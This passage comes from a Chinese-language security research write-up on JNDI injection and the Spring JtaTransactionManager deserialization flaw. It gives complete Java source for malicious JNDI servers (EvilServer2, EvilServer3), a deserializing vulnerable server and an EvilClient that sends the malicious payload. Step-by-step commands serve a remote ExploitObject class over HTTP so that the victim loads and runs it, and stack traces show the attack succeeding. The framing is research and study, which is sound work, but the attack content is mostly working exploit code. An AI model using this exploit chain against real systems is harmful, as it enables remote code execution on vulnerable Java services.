EvilServer用了ReferenceWrapper，但我们需要的是Reference或Referenceable。用
ldap-server.jar失败，不是因为ldap-server.jar，而是因为EvilServer。假设将
ReferenceWrapper替换成A，A是"implements Referenceable"的，估计就可以配合
ldap-server.jar成功。但rt.jar里并无符合要求的A。如果自己实现A，还不如用
marshalsec。

写到此处，当时还写了一句错误的话，"EvilServer中没法直接绑定Reference"。如
今想来，是与"无法对Reference使用exportObject()"搞混了。事实上可以直接绑定
Reference，比如RemoteReferenceServer.java。当时没想起之前绑定过Reference，
写了错误的结论。我对自己说的技术性结论尽可能负责，尤其是写正经文档时，于是
决定写一个EvilServer2.java，直接绑定Reference，预期结果是编译时报错，提示
无法绑定Reference。前面说了，我把对Reference使用exportObject()的编译报错给
弄混到这儿来了。

6.1.3) EvilServer2.java

--------------------------------------------------------------------------
/*
 * javac -encoding GBK -g EvilServer2.java
 */
import javax.naming.*;

public class EvilServer2
{
    public static void main ( String[] argv ) throws Exception
    {
        String              name            = argv[0];
        String              factoryLocation = argv[1];
        String              factory         = argv[2];
        Context             ctx             = new InitialContext();
        Reference           ref             = new Reference
        (
            factory,
            factory,
            factoryLocation
        );
        /*
         * 抛弃ReferenceWrapper，直接绑定Reference
         */
        ctx.rebind( name, ref );
    }
}
--------------------------------------------------------------------------

本来是想看到编译报错，结果编译通过了，当时恍惚了一下。既然编译通过，干脆用
EvilServer2重新测一下rmiregistry的情形。

在testserverbase的父目录执行:

python3 -m http.server -b 192.168.65.23 8080

在test0目录执行:

rmiregistry 1099

在test1目录执行:

java \
-Djava.naming.factory.initial=com.sun.jndi.rmi.registry.RegistryContextFactory \
-Djava.naming.provider.url=rmi://192.168.65.23:1099 \
EvilServer2 any http://192.168.65.23:8080/testserverbase/ ExploitObject

在test2目录执行:

java \
-Dcom.sun.jndi.rmi.object.trustURLCodebase=true \
-Dcom.sun.jndi.ldap.object.trustURLCodebase=true \
VulnerableClient rmi://192.168.65.23:1099/any

靠，用EvilServer2居然得手了。想起getObjectInstance()中176行那个判断，说不
定EvilServer2与ldap-server.jar配合可以得手。

在test0目录执行:

java -jar ldap-server.jar -a -b 192.168.65.23 -p 10389 jndi.ldif

在test1目录执行:

java \
-Djava.naming.factory.initial=com.sun.jndi.ldap.LdapCtxFactory \
-Djava.naming.provider.url=ldap://192.168.65.23:10389/o=anything,dc=evil,dc=com \
EvilServer2 cn=any http://192.168.65.23:8080/testserverbase/ ExploitObject

EvilServer2在用LdapCtxFactory时没能阻塞住，进程直接结束了。而在用
RegistryContextFactory时，EvilServer2阻塞住。为此写EvilServer3.java，用其
他办法产生阻塞，避免进程退出。

6.1.4) EvilServer3.java (最普适)

--------------------------------------------------------------------------
/*
 * javac -encoding GBK -g EvilServer3.java
 */
import javax.naming.*;

public class EvilServer3
{
    public static void main ( String[] argv ) throws Exception
    {
        String              name            = argv[0];
        String              factoryLocation = argv[1];
        String              factory         = argv[2];
        Context             ctx             = new InitialContext();
        Reference           ref             = new Reference
        (
            factory,
            factory,
            factoryLocation
        );
        /*
         * 用RegistryContextFactory时ctx.rebind()产生阻塞，用LdapCtxFactory
         * 时没能阻塞住，只好用System.in.read()确保无论哪种情形都产生阻塞。
         */
        ctx.rebind( name, ref );
        System.in.read();
    }
}
--------------------------------------------------------------------------

在testserverbase的父目录执行:

python3 -m http.server -b 192.168.65.23 8080

在test0目录执行:

java -jar ldap-server.jar -a -b 192.168.65.23 -p 10389 jndi.ldif

在test1目录执行:

java \
-Djava.naming.factory.initial=com.sun.jndi.ldap.LdapCtxFactory \
-Djava.naming.provider.url=ldap://192.168.65.23:10389/o=anything,dc=evil,dc=com \
EvilServer3 cn=any http://192.168.65.23:8080/testserverbase/ ExploitObject

在test2目录执行:

java \
-Dcom.sun.jndi.ldap.object.trustURLCodebase=true \
VulnerableClient ldap://192.168.65.23:10389/cn=any,o=anything,dc=evil,dc=com

用ldap-server.jar测试成功，只与"com.sun.jndi.ldap.object.trustURLCodebase"
相关，与"Dcom.sun.jndi.rmi.object.trustURLCodebase"无关。

用rmiregistry同样测试成功，不赘述。EvilServer3最普适。

前面写得比较啰嗦，可以看出从EvilServer到EvilServer2再到EvilServer3的思考过
程、调试过程，这个过程比结果更重要。

回头说说EvilServer，使用ReferenceWrapper，应该是Alvaro Munoz他们起的头。不
知当时他们怎么想的，为什么要引入不必要的ReferenceWrapper？不但不必要，还缩
小了适用范围，见鬼。ReferenceWrapper是个内部类，没有文档化，第一次看到它时
很困惑，想查一下官方说明都没有。以为它是必须存在的，很多人这样演示。我是不
甘心最初用ldap-server.jar测试失败，对这个失败感到困惑，用调试手段挣扎了一
下，进一步写文档的过程中有了新发现。没有白困惑，也没有白写文档。

参[45]，KINGX给了另一种恶意LDAP Server:

https://github.com/kxcode/JNDI-Exploit-Bypass-Demo/blob/master/HackerServer/src/main/java/HackerLDAPRefServer.java

大概看了看，涉及javaSerializedData，未深究，有兴趣者可以一试。他这个版本有
点类似marshalsec，身兼多职。

8) org.springframework.transaction.jta.JtaTransactionManager

参[46]，iswin写得很好，是我看过讲这个洞的最好的一篇，他改的SpringPOC.java
比原作者清晰。有些人一写PoC就瞎凑合，很不好。目前看到的PoC提供All-In-One方
案。不是黑客，作为老年传统程序员，决定依照本心，把PoC按自己的喜好拆分，不
实用，但有助于我长久记忆。如果实战，推荐iswin的SpringPOC。

后面的PoC用到了如下库:

spring-tx-4.2.4.RELEASE.jar
spring-beans-4.2.4.RELEASE.jar
spring-core-4.2.4.RELEASE.jar
javax.transaction-api-1.2.jar
commons-logging-1.2.jar
spring-context-4.2.4.RELEASE.jar

8.1) VulnerableServer.java

--------------------------------------------------------------------------
/*
 * javac -encoding GBK -g VulnerableServer.java
 */
import java.io.*;
import java.net.*;

public class VulnerableServer
{
    public static void main ( String[] argv ) throws Exception
    {
        String          addr        = argv[0];
        int             port        = Integer.parseInt( argv[1] );
        InetAddress     bindAddr    = InetAddress.getByName( addr );
        /*
         * https://docs.oracle.com/javase/8/docs/api/java/net/ServerSocket.html
         */
        ServerSocket    s_listen    = new ServerSocket( port, 0, bindAddr );
        while ( true )
        {
            Socket              s_accept    = s_listen.accept();
            ObjectInputStream   ois         = new ObjectInputStream( s_accept.getInputStream() );
            Object              obj         = ois.readObject();
            ois.close();
            s_accept.close();
        }
    }
}
--------------------------------------------------------------------------

这是简化版受漏洞影响服务端，只干了一件事，对来自EvilClient的数据进行反序列
化。在此过程中，VulnerableServer有机会扮演JNDI客户端的角色，存在JNDI注入漏
洞。

8.2) EvilServer3.java

同前，这是JNDI服务端动态端口部分。周知端口由rmiregistry提供。

8.3) ExploitObject.java

同前，这是将来在JNDI客户端(VulnerableServer进程空间)被执行的恶意代码。

8.4) EvilClient.java

--------------------------------------------------------------------------
/*
 * javac -encoding GBK -g -cp "spring-tx-4.2.4.RELEASE.jar:spring-beans-4.2.4.RELEASE.jar:." EvilClient.java
 */
import java.io.*;
import java.net.*;
import org.springframework.transaction.jta.JtaTransactionManager;

public class EvilClient
{
    public static void main ( String[] argv ) throws Exception
    {
        String                  addr        = argv[0];
        int                     port        = Integer.parseInt( argv[1] );
        /*
         * rmi://192.168.65.23:1099/any
         */
        String                  evilurl     = argv[2];
        JtaTransactionManager   jtm         = new JtaTransactionManager();
        jtm.setUserTransactionName( evilurl );
        /*
         * https://docs.oracle.com/javase/8/docs/api/java/net/Socket.html
         */
        Socket                  s_connect   = new Socket( addr, port );
        ObjectOutputStream      oos         = new ObjectOutputStream( s_connect.getOutputStream() );
        oos.writeObject( jtm );
        oos.close();
        s_connect.close();
    }
}
--------------------------------------------------------------------------

EvilClient与JNDI没有直接关系，与序列化/反序列化有直接关系。它向受漏洞影响
服务端(VulnerableServer)提交恶意序列化数据，受害者是VulnerableServer。

8.5) 测试

假设目录结构是:

.
|
+---test0
+---test1
|       EvilServer.class
|
+---test2
|       VulnerableServer.class
|       commons-logging-1.2.jar
|       javax.transaction-api-1.2.jar
|       spring-beans-4.2.4.RELEASE.jar
|       spring-context-4.2.4.RELEASE.jar
|       spring-core-4.2.4.RELEASE.jar
|       spring-tx-4.2.4.RELEASE.jar
|
+---test3
|       EvilClient.class
|       commons-logging-1.2.jar
|       javax.transaction-api-1.2.jar
|       spring-beans-4.2.4.RELEASE.jar
|       spring-context-4.2.4.RELEASE.jar
|       spring-core-4.2.4.RELEASE.jar
|       spring-tx-4.2.4.RELEASE.jar
|
\---testserverbase
        ExploitObject.class

那些jar可以共用，之所以test2、test3目录各放一份，仅为强调依赖关系。

在testserverbase的父目录执行:

python3 -m http.server -b 192.168.65.23 8080

在test0目录执行:

rmiregistry 1099

在test1目录执行:

java \
-Djava.naming.factory.initial=com.sun.jndi.rmi.registry.RegistryContextFactory \
-Djava.naming.provider.url=rmi://192.168.65.23:1099 \
EvilServer3 any http://192.168.65.23:8080/testserverbase/ ExploitObject

在test2目录执行:

java \
-Dcom.sun.jndi.rmi.object.trustURLCodebase=true \
-Dcom.sun.jndi.ldap.object.trustURLCodebase=true \
-cp "spring-tx-4.2.4.RELEASE.jar:spring-beans-4.2.4.RELEASE.jar:spring-core-4.2.4.RELEASE.jar:javax.transaction-api-1.2.jar:commons-logging-1.2.jar:spring-context-4.2.4.RELEASE.jar:." \
VulnerableServer 192.168.65.23 1414

对于8u232，必须将两个trustURLCodebase同时设为true，否则不能得手。如果将来
攻击成功，ExploitObject的构造函数将在VulnerableServer进程空间得到执行。

在test3目录执行:

java \
-cp "spring-tx-4.2.4.RELEASE.jar:spring-beans-4.2.4.RELEASE.jar:spring-core-4.2.4.RELEASE.jar:javax.transaction-api-1.2.jar:commons-logging-1.2.jar:spring-context-4.2.4.RELEASE.jar:." \
EvilClient 192.168.65.23 1414 rmi://192.168.65.23:1099/any

8.5.1) ExploitObject()调用栈回溯

攻击得手后，在test2目录那边会看到:

scz is here
Exception in thread "main" org.springframework.transaction.TransactionSystemException: JTA UserTransaction is not available at JNDI location [rmi://192.168.65.23:1099/any]; nested exception is javax.naming.NamingException [Root exception is java.lang.ClassCastException: ExploitObject cannot be cast to javax.naming.spi.ObjectFactory]
        at org.springframework.transaction.jta.JtaTransactionManager.lookupUserTransaction(JtaTransactionManager.java:574)
        at org.springframework.transaction.jta.JtaTransactionManager.initUserTransactionAndTransactionManager(JtaTransactionManager.java:448)
        at org.springframework.transaction.jta.JtaTransactionManager.readObject(JtaTransactionManager.java:1206)
        at sun.reflect.NativeMethodAccessorImpl.invoke0(Native Method)
        at sun.reflect.NativeMethodAccessorImpl.invoke(NativeMethodAccessorImpl.java:62)
        at sun.reflect.DelegatingMethodAccessorImpl.invoke(DelegatingMethodAccessorImpl.java:43)
        at java.lang.reflect.Method.invoke(Method.java:497)
        at java.io.ObjectStreamClass.invokeReadObject(ObjectStreamClass.java:1017)
        at java.io.ObjectInputStream.readSerialData(ObjectInputStream.java:1896)
        at java.io.ObjectInputStream.readOrdinaryObject(ObjectInputStream.java:1801)
        at java.io.ObjectInputStream.readObject0(ObjectInputStream.java:1351)
        at java.io.ObjectInputStream.readObject(ObjectInputStream.java:371)
        at VulnerableServer.main(VulnerableServer.java:22)
Caused by: javax.naming.NamingException [Root exception is java.lang.ClassCastException: ExploitObject cannot be cast to javax.naming.spi.ObjectFactory]
        at com.sun.jndi.rmi.registry.RegistryContext.decodeObject(RegistryContext.java:472)
        at com.sun.jndi.rmi.registry.RegistryContext.lookup(RegistryContext.java:124)
        at com.sun.jndi.toolkit.url.GenericURLContext.lookup(GenericURLContext.java:205)
        at javax.naming.InitialContext.lookup(InitialContext.java:417)
        at org.springframework.jndi.JndiTemplate$1.doInContext(JndiTemplate.java:155)
        at org.springframework.jndi.JndiTemplate.execute(JndiTemplate.java:87)
        at org.springframework.jndi.JndiTemplate.lookup(JndiTemplate.java:152)
        at org.springframework.jndi.JndiTemplate.lookup(JndiTemplate.java:179)
        at org.springframework.transaction.jta.JtaTransactionManager.lookupUserTransaction(JtaTransactionManager.java:571)
        ... 12 more
Caused by: java.lang.ClassCastException: ExploitObject cannot be cast to javax.naming.spi.ObjectFactory
        at javax.naming.spi.NamingManager.getObjectFactoryFromReference(NamingManager.java:163)
        at javax.naming.spi.NamingManager.getObjectInstance(NamingManager.java:319)
        at com.sun.jndi.rmi.registry.RegistryContext.decodeObject(RegistryContext.java:464)
        ... 20 more

在test2目录执行:

java -agentlib:jdwp=transport=dt_socket,address=192.168.65.23:8005,server=y,suspend=y \
-Dcom.sun.jndi.rmi.object.trustURLCodebase=true \
-Dcom.sun.jndi.ldap.object.trustURLCodebase=true \
-cp "spring-tx-4.2.4.RELEASE.jar:spring-beans-4.2.4.RELEASE.jar:spring-core-4.2.4.RELEASE.jar:javax.transaction-api-1.2.jar:commons-logging-1.2.jar:spring-context-4.2.4.RELEASE.jar:." \
VulnerableServer 192.168.65.23 1414

jdb -connect com.sun.jdi.SocketAttach:hostname=192.168.65.23,port=8005

stop in ExploitObject.<init>

  [1] ExploitObject.<init> (ExploitObject.java:9), pc = 0
  [2] sun.reflect.NativeConstructorAccessorImpl.newInstance0 (native method)
  [3] sun.reflect.NativeConstructorAccessorImpl.newInstance (NativeConstructorAccessorImpl.java:62), pc = 85
  [4] sun.reflect.DelegatingConstructorAccessorImpl.newInstance (DelegatingConstructorAccessorImpl.java:45), pc = 5
  [5] java.lang.reflect.Constructor.newInstance (Constructor.java:423), pc = 79
  [6] java.lang.Class.newInstance (Class.java:442), pc = 138
  [7] javax.naming.spi.NamingManager.getObjectFactoryFromReference (NamingManager.java:163), pc = 46
  [8] javax.naming.spi.NamingManager.getObjectInstance (NamingManager.java:319), pc = 94
  [9] com.sun.jndi.rmi.registry.RegistryContext.decodeObject (RegistryContext.java:499), pc = 97
  [10] com.sun.jndi.rmi.registry.RegistryContext.lookup (RegistryContext.java:138), pc = 75
  [11] com.sun.jndi.toolkit.url.GenericURLContext.lookup (GenericURLContext.java:205), pc = 23
  [12] javax.naming.InitialContext.lookup (InitialContext.java:417), pc = 6
  [13] org.springframework.jndi.JndiTemplate$1.doInContext (JndiTemplate.java:155), pc = 5
  [14] org.springframework.jndi.JndiTemplate.execute (JndiTemplate.java:87), pc = 7
  [15] org.springframework.jndi.JndiTemplate.lookup (JndiTemplate.java:152), pc = 55
  [16] org.springframework.jndi.JndiTemplate.lookup (JndiTemplate.java:179), pc = 2
  [17] org.springframework.transaction.jta.JtaTransactionManager.lookupUserTransaction (JtaTransactionManager.java:571), pc = 52
  [18] org.springframework.transaction.jta.JtaTransactionManager.initUserTransactionAndTransactionManager (JtaTransactionManager.java:448), pc = 23
  [19] org.springframework.transaction.jta.JtaTransactionManager.readObject (JtaTransactionManager.java:1,206), pc = 16
  [20] sun.reflect.NativeMethodAccessorImpl.invoke0 (native method)
  [21] sun.reflect.NativeMethodAccessorImpl.invoke (NativeMethodAccessorImpl.java:62), pc = 100
  [22] sun.reflect.DelegatingMethodAccessorImpl.invoke (DelegatingMethodAccessorImpl.java:43), pc = 6
  [23] java.lang.reflect.Method.invoke (Method.java:498), pc = 56
  [24] java.io.ObjectStreamClass.invokeReadObject (ObjectStreamClass.java:1,170), pc = 24
  [25] java.io.ObjectInputStream.readSerialData (ObjectInputStream.java:2,177), pc = 119
  [26] java.io.ObjectInputStream.readOrdinaryObject (ObjectInputStream.java:2,068), pc = 183
  [27] java.io.ObjectInputStream.readObject0 (ObjectInputStream.java:1,572), pc = 401
  [28] java.io.ObjectInputStream.readObject (ObjectInputStream.java:430), pc = 19
  [29] VulnerableServer.main (VulnerableServer.java:22), pc = 51

1至12号栈帧与"4.2) ExploitObject()调用栈回溯"小节完全相同。19号栈帧在调
JtaTransactionManager.readObject()。

参[46]，iswin讨论了这个洞的实际利用场景，举了个JBoss的例子。

☆ 参考资源

[17]
    Java Unmarshaller Security Turning your data into code execution - Moritz Bechler <mbechler@eenterphace.org> [2017-05-22]
    https://github.com/mbechler/marshalsec
    https://www.github.com/mbechler/marshalsec/blob/master/marshalsec.pdf?raw=true

    git clone https://github.com/mbechler/marshalsec.git

[39]
    A Journey From JNDI LDAP Manipulation To RCE - Alvaro Munoz, Oleksandr Mirosh [2016-08-02]
    https://www.blackhat.com/us-16/briefings.html
    https://www.blackhat.com/docs/us-16/materials/us-16-Munoz-A-Journey-From-JNDI-LDAP-Manipulation-To-RCE.pdf
    https://www.blackhat.com/docs/us-16/materials/us-16-Munoz-A-Journey-From-JNDI-LDAP-Manipulation-To-RCE-wp.pdf
    (看wp版本)

    BlackHat 2016回顾之JNDI注入简单解析 - [2016-08-19]
    https://rickgray.me/2016/08/19/jndi-injection-from-theory-to-apply-blackhat-review/

    New Headaches: How The Pawn Storm Zero-Day Evaded Java's Click-to-Play Protection - Jack Tang [2015-10-19]
    https://blog.trendmicro.com/trendlabs-security-intelligence/new-headaches-how-the-pawn-storm-zero-day-evaded-javas-click-to-play-protection/

[44]
    The JNDI Tutorial
    https://docs.oracle.com/javase/jndi/tutorial/
    https://docs.oracle.com/javase/jndi/tutorial/TOC.html

    Storing Objects in the Directory
    https://docs.oracle.com/javase/jndi/tutorial/objects/storing/index.html

    Serializable Objects
    https://docs.oracle.com/javase/jndi/tutorial/objects/storing/serial.html
    https://docs.oracle.com/javase/jndi/tutorial/objects/storing/src/SerObj.java
    https://docs.oracle.com/javase/jndi/tutorial/objects/storing/src/SerObjWithCodebase.java
    (有一段"Specifying a Codebase")

    Referenceable Objects and References
    https://docs.oracle.com/javase/jndi/tutorial/objects/storing/reference.html

    Objects with Attributes
    https://docs.oracle.com/javase/jndi/tutorial/objects/storing/dircontext.html

    Remote Objects
    https://docs.oracle.com/javase/jndi/tutorial/objects/storing/remote.html
    https://docs.oracle.com/javase/jndi/tutorial/objects/storing/src/RemoteObj.java
    https://docs.oracle.com/javase/jndi/tutorial/objects/storing/src/RemoteRef.java
    https://docs.oracle.com/javase/jndi/tutorial/objects/storing/src/RiHelloImpl.java
    https://docs.oracle.com/javase/jndi/tutorial/objects/storing/src/RmiiiopObj.java
    (提到javax.rmi.PortableRemoteObject.narrow)
    (过于陈旧，还动用了rmic命令，java.rmi.server.codebase应该是用于rmic生成的.class)

    CORBA Objects
    https://docs.oracle.com/javase/jndi/tutorial/objects/storing/corba.html

    Custom Object Example
    https://docs.oracle.com/javase/jndi/tutorial/objects/state/custom.html

    Reading Objects from the Directory
    https://docs.oracle.com/javase/jndi/tutorial/objects/reading/index.html
    https://docs.oracle.com/javase/jndi/tutorial/objects/reading/lookup.html
    https://docs.oracle.com/javase/jndi/tutorial/objects/reading/list.html

    Hybrid Naming and Directory Operations
    https://docs.oracle.com/javase/jndi/tutorial/basics/directory/hybrid.html

    https://docs.oracle.com/javase/jndi/tutorial/objects/storing/src/Flower.java
    https://docs.oracle.com/javase/jndi/tutorial/objects/storing/src/Fruit.java
    https://docs.oracle.com/javase/jndi/tutorial/basics/directory/src/Fruit.java (同上)
    https://docs.oracle.com/javase/jndi/tutorial/basics/directory/src/Bind.java
    https://docs.oracle.com/javase/jndi/tutorial/basics/directory/src/Rebind.java
    https://docs.oracle.com/javase/jndi/tutorial/basics/directory/src/Unbind.java
    https://docs.oracle.com/javase/jndi/tutorial/basics/directory/src/Create.java
    https://docs.oracle.com/javase/jndi/tutorial/basics/directory/src/Destroy.java
    https://docs.oracle.com/javase/jndi/tutorial/objects/storing/src/FruitFactory.java
    https://docs.oracle.com/javase/jndi/tutorial/objects/storing/src/RefObj.java
    https://docs.oracle.com/javase/jndi/tutorial/objects/storing/src/Drink.java
    https://docs.oracle.com/javase/jndi/tutorial/objects/storing/src/DrinkFactory.java
    https://docs.oracle.com/javase/jndi/tutorial/objects/storing/src/DirObj.java
    https://docs.oracle.com/javase/jndi/tutorial/objects/storing/src/Hello.java
    https://docs.oracle.com/javase/jndi/tutorial/objects/storing/src/HelloImpl.java
    https://docs.oracle.com/javase/jndi/tutorial/objects/storing/src/HelloApp.idl
    https://docs.oracle.com/javase/jndi/tutorial/objects/storing/src/CorbaObj.java
    https://docs.oracle.com/javase/jndi/tutorial/objects/state/src/CustomObj.java
    https://docs.oracle.com/javase/jndi/tutorial/objects/state/src/Person.java
    https://docs.oracle.com/javase/jndi/tutorial/objects/state/src/PersonStateFactory.java
    https://docs.oracle.com/javase/jndi/tutorial/objects/state/src/PersonObjectFactory.java
    https://docs.oracle.com/javase/jndi/tutorial/objects/state/src/jndi.properties
    https://docs.oracle.com/javase/jndi/tutorial/objects/reading/src/LookupRemote.java
    https://docs.oracle.com/javase/jndi/tutorial/objects/reading/src/LookupCorba.java
    https://docs.oracle.com/javase/jndi/tutorial/objects/reading/src/List.java
    https://docs.oracle.com/javase/jndi/tutorial/objects/reading/src/ListBindings.java

    Java SE 1.3 Downloads
    https://www.oracle.com/java/technologies/java-archive-javase-v13-downloads.html
    (据说其中包括rmiregistry.jar，实际只有rmiregistry.exe)

    https://developer.byu.edu/maven2/content/groups/thirdparty/com/sun/ldap/ldapbp/1.2.4/
    https://developer.byu.edu/maven2/content/groups/thirdparty/com/sun/ldap/ldapbp/1.2.4/ldapbp-1.2.4.jar
    https://github.com/lucee/mvn/tree/master/releases/sun/jndi/ldapbp/1.2.4

    LDAP Directories
    https://docs.oracle.com/javase/jndi/tutorial/objects/representation/ldap.html

[45]
    如何绕过高版本JDK的限制进行JNDI注入利用 - KINGX [2019-06-03]
    https://kingx.me/Restrictions-and-Bypass-of-JNDI-Manipulations-RCE.html
    https://github.com/kxcode/JNDI-Exploit-Bypass-Demo

    深入理解JNDI注入与Java反序列化漏洞利用 - KINGX [2018-08-10]
    https://kingx.me/Exploit-Java-Deserialization-with-RMI.html

[46]
    Spring framework deserialization RCE - zerothoughts [2016-01-22]
    https://zerothoughts.tumblr.com/post/137831000514/spring-framework-deserialization-rce
    https://github.com/zerothoughts/spring-jndi

    Spring framework deserialization RCE漏洞分析以及利用 - iswin [2016-01-24]
    https://www.iswin.org/2016/01/24/Spring-framework-deserialization-RCE-%E5%88%86%E6%9E%90%E4%BB%A5%E5%8F%8A%E5%88%A9%E7%94%A8/
    (这篇比原作写得好)

    由JNDI注入引发的Spring Framework反序列化漏洞 - [2019-09-02]
    https://www.mi1k7ea.com/2019/09/02/%E7%94%B1JNDI%E6%B3%A8%E5%85%A5%E5%AF%BC%E8%87%B4%E7%9A%84Spring-Framework%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/
    (这篇写得很一般)

    Fun with JNDI remote code injection - zerothoughts [2016-01-21]
    https://zerothoughts.tumblr.com/post/137769010389/fun-with-jndi-remote-code-injection
    https://github.com/zerothoughts/jndipoc
    (现实中的例子就是前面那个)